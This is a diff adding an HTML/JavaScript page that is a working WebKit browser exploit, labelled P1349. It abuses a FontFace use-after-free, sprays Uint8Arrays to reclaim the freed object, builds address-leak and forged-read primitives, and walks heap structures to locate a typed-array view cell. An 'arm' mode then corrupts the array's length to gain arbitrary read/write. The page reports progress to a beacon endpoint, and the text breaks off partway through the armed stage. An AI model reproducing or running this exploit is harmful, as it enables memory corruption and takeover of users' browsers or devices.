@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1349 CONVERGENT VIEWCELL</title>
+<style>
+:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--mag:#ff6fd0}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
+#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 15px/1.3 ui-monospace,monospace;padding:13px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
+#log{margin:58px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px}
+.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
+.r .t{color:#53d0e8;font-weight:700}.r .n{color:var(--dim)}
+.r.ok{border-left-color:var(--green)}.r.ok .t{color:var(--green)}
+.r.bad{border-left-color:var(--red)}.r.bad .t{color:var(--red)}
+.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
+</style></head>
+<body>
+<div id="bn">P1349 - convergent view-cell finder: source-exact JSDocument walk + array-holder + seeded block-scan, one m_vector==backing validator. Fresh-open each try.</div>
+<div id="log"></div>
+<script>
+'use strict';
+/* ===================================================================
+   P1349  CONTROL A MARKEDSPACE Uint8Array VIEW CELL  (14.10)
+   CRASH_CLASS: MODERATE in SAFE mode (bounded reads of live held objects
+                in VC's own mapped MarkedBlock) / HIGH with #arm.
+
+   LINEAGE: p1322/p1324 (matchable dangling face + check() oracle),
+            p1329/p1345 (expando bridge), p1346 (W-butterfly walk - MISS),
+            p1348 (JSDocument walk - reaches DOC but NO-VC: storage scan
+            too narrow and hops guessed). p1349 = convergent fusion of the
+            three adversarial angles under ONE validator, now PINNED by the
+            WebKit_1400 source that landed in-repo
+            (artifacts/webkit1400/headers/*).
+
+   WHAT THE SOURCE PINS (replaces the no-source guesses; the offset-free
+   m_vector==backing equality is STILL the sole commit gate, so correctness
+   never depends on a guess - the source just removes the search):
+     JSCell (8B):  m_structureID u32@+0x00 ; m_type(JSType) u8@+0x05
+     JSObject:     m_butterfly@+0x08 ; inline property storage at cell+0x10
+     JSArrayBufferView (sizeof ~0x30):
+                   m_vector  @ +0x10   (VALIDATOR TARGET; cage off => raw)
+                   m_length  @ +0x18   **size_t / 8 bytes** (MAP said 4 - WRONG)
+                   m_byteOffset @ +0x20 ; m_mode(u8) @ +0x28
+                   new Uint8Array(ArrayBuffer(192)) => WastefulTypedArray
+                   (m_mode byte 0x58). canUseRawFieldsDirectly()==true for it
+                   (low 3 bits 0) so length() uses raw m_length => wrap works.
+     FontFace is NOT a ScriptWrappable -> no C++->JS backedge -> W (JSFontFace)
+                   is unreachable from the C++ side. Document IS a
+                   ScriptWrappable, so we reach JSDocument, where we plant.
+     WALK (source + Itanium-ABI confirmed, each hop retried hard):
+                   L2 +0x08 -> FF (C++ FontFace)
+                   FF +0x08 -> DOC (ActiveDOMObject::m_scriptExecutionContext)
+                   DOC+0x08 -> WeakImpl (ScriptWrappable::m_wrapper)   [woff set]
+                   WeakImpl +0x00 -> JSDocument  (mask low 4 bits)
+
+   THREE CONVERGENT PATHS (task: "do both 3"), one validator:
+     PATH B (primary)  directed source-exact walk to JSDocument, then read its
+                       property storage (inline + butterfly negative) for the
+                       planted holders:
+                         document.__arr = HA   (JS Array of the sprays: a clean
+                           contiguous run of view-cell pointers in HA.butterfly)
+                         document.__vK  = sp[k] (named expandos: direct pointers)
+                       commit offset-free on m_vector in BK.
+     PATH C (seeded)   once ONE view cell VC is committed, its IsoSubspace
+                       MarkedBlock (0x4000, 0x4000-aligned, homogeneous, stride
+                       = cell size ~0x30) is swept to recover the 7 siblings -
+                       all reads inside VC's own already-mapped block (no hole
+                       crash). This is the correct role for the block-scan that
+                       p1347 ran blind (and that the angle-1/3 verdicts marked
+                       dead for lack of a typed-array anchor): PATH B is the
+                       anchor.
+     PATH C' (generic, bounded long-shot) if PATH B yields no VC: classify the
+                       MarkedBlocks of the JSDocument candidate cells in <=3
+                       reads each (atoms at stride 0x30, m_vector in BK), sweep
+                       only a block that classifies typed. Expected low-yield
+                       (IsoHeap segregation), kept for completeness, read-capped.
+
+   COMMIT (deliverable 5/6): a heap qword V is a controlled spray view cell IFF
+     *(V+off) == a known backing in BK, for off tried in {0x10,0x08,0x18}
+     (+0x10 is the source offset and is tried first; the 2 extras guard a build
+     surprise). One 64-bit equality, false-positive-free (~2^-64): it proves V
+     is a LIVE view we own, fixes m_vector empirically, and names which sp[k].
+
+   MODES (deliverable 4):
+     default        SAFE: find + validate VC + resolve m_length, beacon, STOP.
+     #arm / ?arm=1  wrap m_length huge (CSSFontFace::setFamily -2/call at
+                    VC+0x18), confirm via plain-JS byteLength, prove base-free
+                    R/W by an OOB write from the giant view into a 2nd known
+                    backing, read back natively.
+
+   DECISIVE BEACONS (hyphen-only):
+     SELF-0x..                   addr(buf) (forge-read calibration)
+     BSET-n<count> / BK-k..-0x.. known spray backings in BK
+     EXPANDO-OK                  document.__arr + __vK stored & verified in JS
+     WALK-FF-0x.. / WALK-DOC-0x.. / WALK-JSDOC-0x..-woff0x..
+     CANDS-n<count>              JSDocument storage candidate pointers
+     VC-MVEC-MATCH-off0x..-k..-bk0x..   THE COMMIT
+     VC-FOUND-0x<addr>           controlled view-cell address
+     BLK-TYPED-0x<block>-n<cnt>  PATH C typed MarkedBlock + sibling count
+     VC-SIB-0x<addr>-k<idx>      recovered sibling view cell
+     MLEN-0x..-WIDTH-<8|4>       resolved length field + width (expect size_t)
+     SAFE-DONE                   SAFE-mode stop (discovery proven, no write)
+     LEN-DEC-FIRE-0x..-x<n>      (arm) decrements fired at the length field
+     LEN-WRAPPED-0x<hex>         (arm) victim.byteLength now huge (plain JS)
+     ARW-PROOF-0x<hex>-at0x..    (arm) OOB write landed in a 2nd backing
+   =================================================================== */
+var LOG=document.getElementById('log'),BN=document.getElementById('bn'),_c=0;
+function S(x,col){BN.textContent=x;BN.style.background=col||'#1b2330';}
+function kls(s){s=(''+s).toLowerCase();
+  if(/vc-found|mvec-match|len-wrapped|arw-proof|blk-typed|vc-sib|-win/.test(s))return'win';
+  if(/hit|ok|dangling|done|holder|self-0x|bset|mlen-0x|walk-/.test(s))return'ok';
+  if(/err|miss|fail|crash|no-|none|collide|noaddr|noleak|dead|throw|unresolved|skip|nohold/.test(s))return'bad';
+  return'';}
+function row(t,d,c){_c++;var r=document.createElement('div');r.className='r '+(c||'');r.innerHTML="<span class='n'>"+_c+"</span> <span class='t'>"+(''+t).replace(/[<>&]/g,'')+"</span>"+(d?" <span>"+(''+d).replace(/[<>&]/g,'')+"</span>":"");LOG.appendChild(r);while(LOG.childNodes.length>44)LOG.removeChild(LOG.firstChild);}
+/* B(tag,data): render + synchronous-XHR beacon. Full hyphen string in `tag`. */
+function B(tag,data){row(tag,data,kls(tag+' '+(data||'')));try{var s=(''+(data||'')).replace(/[^A-Za-z0-9._-]/g,'_').slice(0,300);var u='/beacon.php?tag=P1349-'+encodeURIComponent(tag);if(data)u+='&data='+encodeURIComponent(s);u+='&t='+Date.now();var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}}
+window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,70)+'@'+l);};
+B('VER','1');
+
+/* ---- little-endian helpers on a Uint8Array (backing bytes) ---- */
+function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
+function wq(u,o,v){for(var i=0;i<8;i++){u[o+i]=Number(v&0xFFn);v>>=8n;}}
+function wd(u,o,v){for(var i=0;i<4;i++){u[o+i]=(v>>>(8*i))&0xFF;}}
+/* ---- helpers on a decoded hex string (forge-read output) ---- */
+function qAt(h,bo){var o=bo*2;if(o+16>h.length)return 0n;return BigInt('0x'+h.slice(o,o+16).match(/../g).reverse().join(''));}
+function bAt(h,bo){var o=bo*2;if(o+2>h.length)return -1;return parseInt(h.slice(o,o+2),16);}
+
+/* ---- address classification (crash guard) ---- */
+var heapLo=0x1000000000n, heapHi=0x1100000000n;
+function heap(v){return v>heapLo && v<heapHi;}            /* WebKit JS/DOM heap; EXCLUDES .text 0x8xx.. */
+function isMV(v){return v>=0x800100000n && v<0xA00000000n;} /* module vtable (C++ object marker) */
+function jtOf(h){return Number((qAt(h,0)>>40n)&0xFFn);}     /* JSType = JSCell byte 5 (source-confirmed) */
+function sidOf(h){return Number(qAt(h,0)&0xFFFFFFFFn);}     /* StructureID = JSCell low u32 */
+function looksCell(h){ if(h.length<16)return false; if(isMV(qAt(h,0)))return false; var s=sidOf(h); if(!(s>0&&s<0x4000000))return false; return jtOf(h)!==0; }
+
+/* ===================================================================
+   PROVEN SCAFFOLD (verbatim from p1322/p1324/p1327/p1329/p1348):
+   reclaim a CSS-connected CSSFontFace into a sprayed Uint8Array(192),
+   derive L1/L2 + the dangling wrapper W, build the forge-read.
+   =================================================================== */
+var buf=null,L1=null,L2=null,W=null,K=40,fired=false,sp=[],fs=null;
+var FAM='zq7k3mx';
+var ARMED=(location.hash.indexOf('arm')>=0)||/[?&]arm=1/.test(location.search);
+var NVIC=8;                 /* # of spray backings to resolve into BK (addrOf) */
+var SELFCP=0x6100;          /* buf self-marker codepoint */
+var VICCP0=0x8000;          /* victim marker codepoints (VICCP0 + j*4) */
+
+try{var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});document.fonts.add(vf);void vf.loaded;
+ fs=document.createElement('style');fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';document.head.appendChild(fs);}catch(e){B('SETUP-ERR',(''+e).slice(0,40));}
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+ if(fired)return undefined;fired=true;
+ try{if(fs){fs.textContent='';fs.remove();}}catch(e){}try{document.fonts.delete(this);}catch(e){}fs=null;try{document.body.offsetHeight;}catch(e){}
+ for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(192));w[0x82]=3;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;sp.push(w);}
+ return undefined;},set:function(){}});
+try{document.fonts.load('1em vf, v1','AB').then(function(f){window.__lf=f;setTimeout(scan,80);},function(){setTimeout(scan,80);});}catch(e){B('LOAD-ERR',(''+e).slice(0,40));}
+setTimeout(function(){if(!buf)scan();},450);
+
+function scan(){
+ if(buf)return;var hit=-1;
+ for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>heapLo&&a<0x8000000000n){L1=a;L2=le(sp[i],0x68);buf=sp[i];hit=i;break;}}
+ if(hit<0){B('RECLAIM-MISS','CLOSE+REOPEN');S('miss - fresh-open','#4a2a12');return;}
+ if(L2===0n||!heap(L2)){B('NOLEAK','L2=0x'+(L2?L2.toString(16):'0')+' - fresh-open');S('no L2 - fresh-open','#4a2a12');return;}
+ window.__hit=hit;
+ B('HIT','L1=0x'+L1.toString(16)+' L2=0x'+L2.toString(16)+' dIdx='+hit);
+ var cands=[];if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(window.__lf[i]);
+ buf[0x82]=4;for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i].status;}catch(e){}if(st==='error'){W=cands[i];break;}}
+ buf[0x82]=3;
+ if(!W){B('NOT-DANGLE','fresh-open');S('not dangling - fresh-open','#4a2a12');return;}
+ B('RECLAIM-OK',ARMED?'ARMED (#arm): will wrap m_length after commit':'SAFE: locate+validate only');
+ S('dangling - matchable + BK + convergent discovery','#0c7a3a');setTimeout(go,100);
+}
+function chk(cp){try{return document.fonts.check('16px "'+FAM+'"',String.fromCodePoint(cp))?'T':'F';}catch(e){return 'E';}}
+
+/* ---- self-calibrated style forge-read (verbatim from p1294/p1329) ---- */
+var self=0n;
+function forgeRead(daddr,dlen){
+ for(var ib=0;ib<sp.length;ib++){var vb=sp[ib];if(!vb)continue;
+   wq(vb,0x08,self+0x70n);vb[0x10]=0;
+   wd(vb,0x30,4);wd(vb,0x34,dlen);wq(vb,0x38,daddr);wd(vb,0x40,4);
+   vb[0x44]=0x7A;vb[0x45]=0x7A;vb[0x46]=0x71;
+   wd(vb,0x70,4);wd(vb,0x74,0x10);vb[0x78]=14;vb[0x79]=0;wq(vb,0x7A,self+0x90n);
+   wd(vb,0x90,3);wd(vb,0x94,72);wq(vb,0x98,self+0x30n);
+ }
+}
+function dec(s,lim){var by=[],q=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q;
+ while(k<e&&by.length<lim){var ch=s.charAt(k);
+   if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+     if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+     else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+   else{by.push(s.charCodeAt(k));k++;}}
+ var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;}
+function snapAll(){var m=[];for(var i=0;i<sp.length;i++){var c=new Uint8Array(192);for(var j=0;j<192;j++)c[j]=sp[i][j];m.push(c);}return m;}
+function restoreAll(snap){for(var i=0;i<sp.length;i++){for(var j=0;j<192;j++)sp[i][j]=snap[i][j];}}
+var SAFE_SNAP=null, READS=0, READCAP=1200;   /* forge-read budget guard */
+function rdH(daddr,n){
+ if(!heap(daddr)){return '';}            /* GUARD: never forge-read outside the heap (XOM/unmapped) */
+ for(var att=0;att<2;att++){            /* retry once: the forge-read is ~flaky per call */
+   if(READS>=READCAP){B('READCAP',''+READS);return '';}
+   READS++;
+   if(SAFE_SNAP)restoreAll(SAFE_SNAP);
+   forgeRead(daddr,n);
+   var out='';try{out=dec(String(W.style),n);}catch(e){out='';}
+   if(SAFE_SNAP)restoreAll(SAFE_SNAP);
+   if(out.length>=16) return out;
+ }
+ return '';}
+/* retry-HARD read for the thin multi-hop walk (memory: the leak is coin-flip;
+   retry many times before calling a hop dead). */
+function rdHx(daddr,n,tries){ var o=''; for(var t=0;t<tries&&o==='';t++){ if(READS>=READCAP)break; o=rdH(daddr,n);} return o; }
+
+/* ---- oracle range writer (for self + BK discovery) ---- */
+function setRanges(X){wq(buf,0x20,X);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);}
+
+function go(){
+ if(window.__g)return;window.__g=true;
+
+ /* ---- make the dangling face matchable so setFamily/unicodeRange survive
+         and the check()-oracle fires (P1322/P1324) ---- */
+ for(var i=0x58;i<0x68;i++)buf[i]=0; wq(buf,0x08,L1); buf[0x10]=0;
+ try{ W.family=FAM; }catch(e){ B('SETFAM-ERR',(''+(e&&e.message||e)).slice(0,40)); S('setFamily crashed','#4a2a12'); return; }
+ try{ document.fonts.add(W); }catch(e){}
+ buf[0x82]=1;
+ var ur='U+100-101';for(var i=1;i<24;i++){var a=0x200+i*2;ur+=',U+'+a.toString(16)+'-'+(a+1).toString(16);}
+ var U=0n;try{ W.unicodeRange=ur; U=le(buf,0x20); B('ANCHOR','U=0x'+U.toString(16)); }catch(e){ B('UR-ERR',(''+(e&&e.message||e)).slice(0,40)); }
+ wd(buf,0x20,0);wd(buf,0x24,0);wd(buf,0x28,0);wd(buf,0x2C,0);var rA=chk(0x41);
+ setRanges(L1);var rB=chk(0x41);
+ B('ORACLE','empty='+rA+' high='+rB);
+ if(!(rA==='F'&&rB==='T')){B('ORA-NO-MATCH','cannot scan - fresh-open');S('oracle dead - fresh-open','#4a2a12');return;}
+ if(U===0n){B('NO-ANCHOR','');return;}
+
+ var WIN=0x6000n, STEP=0x10n;
+
+ /* ---- (1) self = addr(buf): plant a marker in buf, oracle-scan for it ---- */
+ for(var sz=0x30;sz<0x38;sz++)buf[sz]=0; buf[0x30]=SELFCP&0xFF;buf[0x31]=(SELFCP>>8)&0xFF;buf[0x34]=SELFCP&0xFF;buf[0x35]=(SELFCP>>8)&0xFF;
+ for(var X=U-WIN; X<U+WIN; X+=STEP){ setRanges(X+0x30n); if(chk(SELFCP)==='F'&&chk(SELFCP+1)==='T'){ self=X; break; } }
+ buf[0x30]=0;buf[0x31]=0;buf[0x34]=0;buf[0x35]=0;
+ if(self===0n){B('NOSELF','buf marker not near U - fresh-open');S('no self - fresh-open','#4a2a12');return;}
+ B('SELF','0x'+self.toString(16));
+
+ /* ---- (2) BK = known spray backings (addrOf). Plant a unique marker in NVIC
+         non-dangling spray buffers, one oracle pass assigns each address.
+         BK[j] = {a: backing addr, o: the sp[] JS Uint8Array, idx}.          ---- */
+ var BK=[], vics=[];
+ for(var k=0,used=0; k<sp.length && used<NVIC; k++){
+   if(k===window.__hit) continue;                       /* skip the dangling overlay buffer */
+   var cp=VICCP0+used*4;
+   sp[k][0x30]=cp&0xFF;sp[k][0x31]=(cp>>8)&0xFF;sp[k][0x34]=cp&0xFF;sp[k][0x35]=(cp>>8)&0xFF;
+   vics.push({idx:k,cp:cp,a:0n,o:sp[k]}); used++;
+ }
+ var remaining=vics.length;
+ for(var X2=self-WIN; X2<self+WIN && remaining>0; X2+=STEP){
+   setRanges(X2+0x30n);
+   for(var vi=0; vi<vics.length; vi++){ var v=vics[vi]; if(v.a!==0n) continue;
+     if(chk(v.cp)==='F'&&chk(v.cp+1)==='T'){ v.a=X2; remaining--; } }
+ }
+ for(var vi2=0; vi2<vics.length; vi2++){ var vv=vics[vi2]; vv.o[0x30]=0;vv.o[0x31]=0;vv.o[0x34]=0;vv.o[0x35]=0;
+   if(vv.a!==0n) BK.push(vv); }
+ B('BSET','n'+BK.length);
+ for(var jj=0;jj<BK.length;jj++) B('BK-k'+BK[jj].idx+'-0x'+BK[jj].a.toString(16),'');
+ if(BK.length<2){ B('NO-BSET','need>=2 backings - widen WIN / fresh-open'); S('no BK - fresh-open','#4a2a12'); return; }
+ function whichB(addr){ for(var i=0;i<BK.length;i++) if(BK[i].a===addr) return BK[i]; return null; }
+
+ /* ---- (3) plant BOTH holders on `document` (JSDocument is the reachable
+         ScriptWrappable). HA = a JS Array of the sprays gives a clean
+         contiguous view-cell run in HA.butterfly; named __vK give direct
+         pointers. Either route is committed offset-free below. ---- */
+ var HA=[]; for(var bi=0; bi<BK.length; bi++){ HA.push(BK[bi].o); }
+ try{ document.__arr = HA; }catch(e){}
+ for(var bi2=0; bi2<BK.length; bi2++){ try{ document['__v'+BK[bi2].idx]=BK[bi2].o; }catch(e){} }
+ var _eok=false; try{ _eok=(document.__arr===HA && BK.length>0 && document['__v'+BK[0].idx]===BK[0].o); }catch(e){}
+ B('EXPANDO-'+(_eok?'OK':'FAIL'),'arr+n'+BK.length+'-on-document');
+
+ /* freeze the safe (matchable, ranges-clear, Loading) shape for rdH restores,
+    then take the face OUT of the set so layout can't touch buf mid-forge. */
+ wd(buf,0x20,0);wd(buf,0x24,0);wd(buf,0x28,0);wd(buf,0x2C,0);buf[0x82]=1;
+ SAFE_SNAP=snapAll();
+ try{document.fonts.delete(W);}catch(e){}
+
+ /* ===================================================================
+    THE COMMIT VALIDATOR (offset-free, source +0x10 first)
+    =================================================================== */
+ var MVO=[0x10,0x08,0x18];  /* +0x10 = JSArrayBufferView::m_vector (source) */
+ function whichBat(ph){ for(var mi=0;mi<MVO.length;mi++){ var mv=qAt(ph,MVO[mi]); var w=whichB(mv); if(w) return {w:w,off:MVO[mi],mv:mv}; } return null; }
+ /* test a heap pointer as a controlled view cell */
+ function asView(P){ if(!heap(P))return null; var ph=rdHx(P,0x30,3); if(ph==='')return null; var m=whichBat(ph); if(m) return {cell:P,w:m.w,off:m.off}; return null; }
+ /* test a heap pointer as the HA array holder: a contiguous butterfly slot is a view cell */
+ function asArrayHolder(P){ if(!heap(P))return null; var hh=rdHx(P,0x10,2); if(hh===''||isMV(qAt(hh,0)))return null;
+   var but=qAt(hh,8); if(!heap(but))return null;
+   var seg=rdHx(but,0x80,2); if(seg==='')return null;          /* positive contiguous elements */
+   for(var eo=0; eo*2+16<=seg.length; eo+=8){ var v=asView(qAt(seg,eo)); if(v) return v; } return null; }
+
+ var VC=0n, mvOff=-1, matched=null;
+
+ /* ---- PATH B: directed source-exact walk L2 -> FF -> DOC -> JSDocument ---- */
+ var r=rdHx(L2,0x10,5), FF=(r!=='')?qAt(r,8):0n;
+ if(heap(FF)) B('WALK-FF-0x'+FF.toString(16),'L2+0x08');
+ var DOC=0n; if(heap(FF)){ var r2=rdHx(FF,0x10,5); DOC=(r2!=='')?qAt(r2,8):0n; }
+ if(heap(DOC)) B('WALK-DOC-0x'+DOC.toString(16),'FF+0x08 ActiveDOMObject::context');
+ var JSDOC=0n, woff=-1;
+ if(heap(DOC)){
+   var DW=[0x08,0x10,0x18,0x20];   /* ScriptWrappable::m_wrapper (self-validated) */
+   for(var wi3=0; wi3<DW.length && VC===0n; wi3++){
+     var rw=rdHx(DOC+BigInt(DW[wi3]),0x10,4); if(rw==='')continue; var wp=qAt(rw,0);
+     if(!heap(wp))continue;
+     var rj=rdHx(wp,0x10,4); if(rj==='')continue; var jd=qAt(rj,0)& ~0xFn;   /* WeakImpl::m_jsValue */
+     if(!heap(jd))continue;
+     /* collect JSDocument property-storage candidate pointers */
+     var cand=[], cs={};
+     function addc(p){ if(!heap(p))return; var kk=p.toString(16); if(cs[kk])return; cs[kk]=1; cand.push(p); }
+     var inl=rdHx(jd,0x90,3); if(inl!=='') for(var so=0x10; so*2+16<=inl.length; so+=8) addc(qAt(inl,so));
+     var jch=rdHx(jd,0x10,3); var jbut=(jch!=='')?qAt(jch,8):0n;
+     if(heap(jbut)){ var seg2=rdHx(jbut-0x200n,0x200,3); if(seg2!=='') for(var bo=0; bo*2+16<=seg2.length; bo+=8) addc(qAt(seg2,bo)); }
+     if(cand.length){ JSDOC=jd; woff=DW[wi3]; B('WALK-JSDOC-0x'+jd.toString(16)+'-woff0x'+DW[wi3].toString(16),''); B('CANDS','n'+cand.length); }
+     /* commit: direct view cell first, then array-holder */
+     for(var ci=0; ci<cand.length && VC===0n && ci<90; ci++){
+       var v=asView(cand[ci]);
+       if(v){ VC=v.cell; matched=v.w; mvOff=v.off; B('VC-MVEC-MATCH-off0x'+v.off.toString(16)+'-k'+v.w.idx+'-bk0x'+v.w.a.toString(16),'direct-expando'); break; }
+       var va=asArrayHolder(cand[ci]);
+       if(va){ VC=va.cell; matched=va.w; mvOff=va.off; B('VC-MVEC-MATCH-off0x'+va.off.toString(16)+'-k'+va.w.idx+'-bk0x'+va.w.a.toString(16),'arr-holder-0x'+cand[ci].toString(16)); break; }
+     }
+     if(JSDOC!==0n) break;   /* this wrapper offset reached storage; stop sweeping woff */
+   }
+ }
+
+ /* ---- PATH C' (generic, bounded) only if PATH B yielded no VC: classify the
+         MarkedBlocks of the candidate cells themselves (they are mapped), sweep
+         a block that classifies typed. <=3 reads to classify; read-capped. ---- */
+ if(VC===0n && heap(JSDOC)){
+   var seeds=[JSDOC], ss={}; ss[JSDOC.toString(16)]=1;
+   /* reuse the last candidate set is out of scope here; re-derive a couple of
+      mapped MarkedSpace seeds from JSDOC's own inline slots */
+   var si=rdHx(JSDOC,0x90,2); if(si!=='') for(var q0=0x10; q0*2+16<=si.length; q0+=8){ var sp0=qAt(si,q0); if(heap(sp0)&&!ss[sp0.toString(16)]){ ss[sp0.toString(16)]=1; seeds.push(sp0);} }
+   for(var sidx=0; sidx<seeds.length && VC===0n && READS<READCAP-120; sidx++){
+     var blk=seeds[sidx] & ~0x3FFFn;
+     /* classify in <=3 reads: atoms at stride 0x30, look for m_vector in BK */
+     var typed=false;
+     for(var a3=0;a3<3;a3++){ var cc=rdHx(blk+BigInt(a3*0x30),0x20,1); if(cc===''){ continue; } if(whichB(qAt(cc,0x10))){ typed=true; break; } }
+     if(!typed) continue;
+     B('BLK-CLASSIFY-0x'+blk.toString(16),'typed-candidate');
+     for(var off=0; off<0x4000 && VC===0n && READS<READCAP-60; off+=0x30){
+       var v=asView(blk+BigInt(off)); if(v){ VC=v.cell; matched=v.w; mvOff=v.off; B('VC-MVEC-MATCH-off0x'+v.off.toString(16)+'-k'+v.w.idx+'-bk0x'+v.w.a.toString(16),'blockscan-0x'+blk.toString(16)); } }
+   }
+ }
+
+ if(VC===0n){ restoreAll(SAFE_SNAP); B('NO-VC','no sp[] view cell reached (JSDOC=0x'+(JSDOC?JSDOC.toString(16):'0')+' BK='+BK.length+') - fresh-open'); S('no view cell - fresh-open','#4a2a12'); try{document.fonts.add(W);}catch(e){} return; }
+ B('VC-FOUND-0x'+VC.toString(16),'m_vector@+0x'+mvOff.toString(16)+' sp['+matched.idx+']');
+ S('VIEW CELL located + m_vector confirmed','#0a7a2a');
+
+ /* ---- PATH C (seeded): sweep VC's own (mapped) MarkedBlock for the siblings.
+         Homogeneous IsoSubspace, stride = cell size ~0x30. All reads inside the
+         already-mapped block -> no unmapped-hole crash. ---- */
+ var fam=[{cell:VC,w:matched}]; var seen={}; seen[VC.toString(16)]=1;
+ var vblk = VC & ~0x3FFFn, sib=0;
+ for(var off2=0; off2<0x4000 && READS<READCAP-80; off2+=0x30){
+   var A=vblk+BigInt(off2); var kk2=A.toString(16); if(seen[kk2])continue;
+   var ph2=rdHx(A,0x20,1); if(ph2==='')continue; var w2=whichB(qAt(ph2,0x10));
+   if(w2){ seen[kk2]=1; fam.push({cell:A,w:w2}); sib++; B('VC-SIB-0x'+A.toString(16)+'-k'+w2.idx,''); }
+ }
+ B('BLK-TYPED-0x'+vblk.toString(16)+'-n'+fam.length,'siblings='+sib);
+
+ /* ---- resolve m_length offset + width against the victim's real JS byteLength
+         (self-validation, read-only). Source: m_length is size_t@+0x18, so the
+         WIDTH-4 (low dword) wrap is the expected hit; WIDTH-8 kept as a guard. ---- */
+ var vh=rdHx(VC,0x30,3);
+ var expLen=BigInt(matched.o.byteLength);                   /* 0xC0 for Uint8Array(ArrayBuffer(192)) */
+ var lenOff=-1, width=0, decTgt=0n, decCalls=0, mlenRaw=0n;
+ var tryOff=[mvOff+8, 0x18, 0x1C, 0x20];
+ for(var ti=0; ti<tryOff.length; ti++){ var LO=tryOff[ti]; if(LO+8>0x30)continue;
+   var q=qAt(vh,LO), lo=q&0xFFFFFFFFn, hi=q>>32n;
+   if(lo===expLen && hi===0n){ lenOff=LO;width=4;decTgt=VC+BigInt(LO);decCalls=0x61;mlenRaw=q;break; }   /* size_t low dword (expected) */
+   if(lo===expLen){ lenOff=LO;width=4;decTgt=VC+BigInt(LO);decCalls=0x61;mlenRaw=q;break; }
+   if(hi===expLen && lo===0n){ lenOff=LO;width=8;decTgt=VC+BigInt(LO+4);decCalls=0x61;mlenRaw=q;break; } /* unusual high placement */
+ }
+ if(lenOff<0){ restoreAll(SAFE_SNAP); B('MLEN-UNRESOLVED','no dword==0x'+expLen.toString(16)+' in VC[0x10..0x28] q18=0x'+qAt(vh,0x18).toString(16)); S('mlen offset unknown - report VC dump','#4a2a12'); try{document.fonts.add(W);}catch(e){} return; }
+ B('MLEN-0x'+mlenRaw.toString(16)+'-WIDTH-'+width,'off0x'+lenOff.toString(16)+' decTgt0x'+decTgt.toString(16)+' x'+decCalls);
+
+ if(!ARMED){ restoreAll(SAFE_SNAP); B('SAFE-DONE','view cell controlled + '+fam.length+' siblings + length field resolved. Re-run with #arm to wrap.'); S('SAFE-DONE - add #arm to weaponize','#0a7a2a'); try{document.fonts.add(W);}catch(e){} return; }
+
+ /* ================= ARMED: wrap m_length, prove arbitrary R/W ================= */
+ /* switch buf from forge-read shape to the P1310 decrement shape: m_family
+    (buf+0x18) = tgtAddr; each W.family= runs CSSValue::deref() twice (-2). */
+ function fireDec(tgtAddr,times){
+   restoreAll(SAFE_SNAP);
+   for(var i3=0x58;i3<0x68;i3++)buf[i3]=0; wq(buf,0x08,L1); buf[0x10]=0; wq(buf,0x18,tgtAddr); buf[0x82]=3;
+   try{ document.fonts.add(W); }catch(e){}
+   var f=0; for(var t=0;t<times;t++){ try{ W.family='z'+(t&0x7FFF); f++; }catch(e){ break; } }
+   return f;
+ }
+ function bl(){ try{ return matched.o.byteLength; }catch(e){ return 0; } }
+
+ var f1=fireDec(decTgt,decCalls);
+ B('LEN-DEC-FIRE-0x'+decTgt.toString(16)+'-x'+f1,'width'+width);
+ var nb=bl();
+ /* width self-correction guard (source says size_t, so low-dword wrap should hit;
+    this only fires on a surprise): try the high dword of the size_t. */
+ if(nb<=0x1000000){
+   var dt2=VC+BigInt(lenOff+4);
+   var f2=fireDec(dt2,1);
+   B('LEN-DEC-FIRE-0x'+dt2.toString(16)+'-x'+f2,'fallback-high-dword');
+   nb=bl();
+ }
+ var nbh=(nb>>>0).toString(16); if(nb>0xFFFFFFFF) nbh=nb.toString(16);
+ if(nb>0x1000000){ B('LEN-WRAPPED-0x'+nbh,'victim sp['+matched.idx+'] byteLength now huge'); S('LEN-WRAPPED - giant view live','#0a7a2a'); }
+ else { restoreAll(SAFE_SNAP); B('LEN-WRAP-MISS-0x'+nbh,'byteLength not huge; try FastTypedArray victim (new Uint8Array(192), m_mode 0x10, no 2nd bound)'); try{document.fonts.add(W);}catch(e){} return; }
+
+ /* cross-view R/W proof (NO forge-read): pick a 2nd known backing ABOVE the
+    victim, write OOB from the giant view, read it back natively. */
+ var tgt=null; for(var gi=0;gi<BK.length;gi++){ if(BK[gi].a>matched.a){ if(!tgt||BK[gi].a<tgt.a) tgt=BK[gi]; } }
